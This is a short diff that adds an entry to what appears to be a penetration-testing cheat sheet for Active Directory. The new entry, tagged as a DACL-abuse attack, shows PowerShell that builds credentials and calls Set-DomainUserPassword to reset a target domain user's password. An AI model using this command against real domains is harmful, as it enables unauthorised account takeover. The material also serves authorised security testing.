@@ -30,3 +30,14 @@ Import-Module .\Microsoft.ActiveDirectory.Management.dll
 ```
 Get-Command -Module Microsoft.ActiveDirectory.Management
 ```
+
+
+## change user password
+#plateform/windows #target/remote  #cat/ATTACK/DACL-ABUSE 
+```
+$SecPassword = ConvertTo-SecureString '<password>' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('<domain_netbios>\<user>', $SecPassword)
+$UserPassword = ConvertTo-SecureString '<new_password>' -AsPlainText -Force
+Set-DomainUserPassword -Identity <target_user> -AccountPassword $UserPassword -Credential $Cred
+```
+
